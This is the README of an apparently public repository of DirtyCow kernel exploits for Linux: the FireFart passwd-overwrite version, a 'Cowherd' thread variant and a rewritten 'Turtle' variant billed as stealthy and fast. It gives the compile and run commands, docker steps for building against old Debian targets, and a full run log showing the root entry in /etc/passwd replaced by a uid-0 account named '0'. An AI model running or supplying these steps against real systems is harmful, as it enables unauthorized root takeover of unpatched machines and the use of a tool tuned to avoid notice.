# DirtyCow Origin :cow:

This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line.
The user will be prompted for the new password when the binary is run.
The original /etc/passwd file is then backed up to /tmp/passwd.bak and overwrites the root account with the generated line.
After running the exploit you should be able to login with the newly created user.

To use this exploit modify the user values according to your needs.

The default user being created is `firefart`.

Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
  https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c

Compile with:

```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

Then run the newly create binary by either doing:
```bash
./dirty
```

or

```bash
 ./dirty my-new-password
 ```
Afterwards, you can either `su firefart` or `ssh firefart@...`

**DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!**

```bash
mv /tmp/passwd.bak /etc/passwd
```

Exploit adopted by Christian "FireFart" Mehlmauer

https://firefart.at

# DirtyCow with Cowherd :cow: :woman_farmer:

In this version the additional `cowherd thread` stop the original threads when the job is done.

## Compile for Debian Squeeze 32
* Use a docker target os to compile the exploit 
```
docker run --platform linux/386 -it -v $(pwd):/tmp debian/eol:squeeze
root@07ccd56551fe:/# apt-get update
...
root@07ccd56551fe:/# apt-get install gcc
....
root@07ccd56551fe:/# cd /tmp
root@07ccd56551fe:/tmp# head -n 20 dirty.c
...
root@07ccd56551fe:/tmp# head -n 20 cowherd.c
...
```
* Follow the compilation instructions
* Use it as the original


# Turtle :rabbit: :turtle:

This is a completely rewriting that "better" exploit of the dirty cow flaw by
1. optimizing the substitution algorithm
    * works by chunks not single character
    * watches each chunk and stop trying if the chunk's substitution is done
1. not stressing the scheduler so non atomic operations has better chance to appear

Which results that the exploit is
* **stealthy** because it don't stress the machine beacuse (not overload)
* **very fast**, the execution time is some `µs` versus some `seconds`

## Compile for Debian Wheezy 64

* Use a docker target os to compile the exploit 
```
docker run --platform linux/amd64 -it -v $(pwd):/tmp debian/eol:wheezy
root@07ccd56551fe:/# apt-get update
...
root@07ccd56551fe:/# apt-get install gcc
....
root@07ccd56551fe:/# cd /tmp
root@07ccd56551fe:/# gcc -pthread main.c -o turtle
```
## Use

```
$ ./turtle 

⛔ usage: build_name race_length race_interval advisor_interval

$ ./turtle 256 1 3

       236 µs	● run process[MAIN] >> thread[main]
       340 µs	⚬ ● run process[MAIN] >> thread[main] >>> function[main_setup]
       421 µs	⚬ ⚬ ● run process[MAIN] >> thread[main] >>> function[main_setup -> main_backup_passwd_file]
     4,023 µs	⚬ ⚬ ● end process[MAIN] >> thread[main] >>> function[main_setup -> main_backup_passwd_file]
     4,067 µs	⚬ ⚬ ● run process[MAIN] >> thread[main] >>> function[main_setup -> main_map_passwd_file_to_memory]
     4,154 µs	⚬ ⚬ ● end process[MAIN] >> thread[main] >>> function[main_setup -> main_map_passwd_file_to_memory]
     4,169 µs	⚬ ● end process[MAIN] >> thread[main] >>> function[main_setup -> main_setup]
     4,299 µs	● run process[POKEMON (MAIN is now POKEMON)] >> thread[main]
     4,328 µs	⚬ ● run process[POKEMON] >> thread[main] >>> function[pokemon_setup]
     4,352 µs	⚬ ● run process[COWHERD -> ADVISOR] >> thread[main]
     4,488 µs	⚬ ⚬ ● run process[POKEMON -> ADVISOR] >> thread[main] >>> function[advisor_setup]
     4,985 µs	⚬ ● run process[POKEMON -> ADVISOR] >> thread[advisor]
     5,030 µs	⚬ ⚬ ● run process[POKEMON -> ADVISOR] >> thread[advisor] >>> function[advise_kernel]🐮🔄
     5,593 µs	⚬ ● end process[COWHERD -> POKEMON] >> thread[main] >>> function[pokemon_setup]
     5,778 µs	⚬ ● run process[COWHERD -> POKEMON] >> thread[main] >>> function[pokemon_run]🐮🔄
     5,794 µs	⚬ ⚬ ● run process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_read_passwd_root_line]
     5,877 µs	⚬ ⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_read_passwd_root_line]
     5,892 µs	⚬ ⚬ ● run process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_print_passwd_root_line]
     5,906 µs	● root:x:0:0:root:/root:/bin/bash
     5,915 µs	⚬ ⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_print_passwd_root_line]
     7,570 µs	⚬ ⚬ ● run process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_read_passwd_root_line]
     7,610 µs	⚬ ⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_read_passwd_root_line]
     7,618 µs	⚬ ⚬ ● run process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_print_passwd_root_line]
     7,627 µs	● 0:002UBq03Nvvos:0:0:::/bin/bash
     7,631 µs	⚬ ⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run -> pokemon_print_passwd_root_line]
     7,717 µs	⚬ ⚬ ● run process[POKEMON -> ADVISOR] >> thread[main] >>> function[advisor_sigterm]
     7,768 µs	● ADVISOR: .........34 memory advise
     7,790 µs	⚬ ⚬ ● end process[POKEMON -> ADVISOR] >> thread[main] >>> function[advisor_sigterm]
     7,816 µs	⚬ ● end process[POKEMON -> ADVISOR] >> thread[main]
     8,045 µs	● POKEMON: ......1,024 ptrace poketext
     8,054 µs	⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run]🐮🔄
     8,061 µs	● end process[POKEMON] >> thread[main]

$ head -n 3 /etc/passwd
0:002UBq03Nvvos:0:0:::/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
...
```
Now
* the name of the user having the `id 0` (former `root`) is `0` and is password too :hushed:
* the integrity the second line of the `/etc/passwd` is preserved because the lenght of the first line is unchanged :wink:


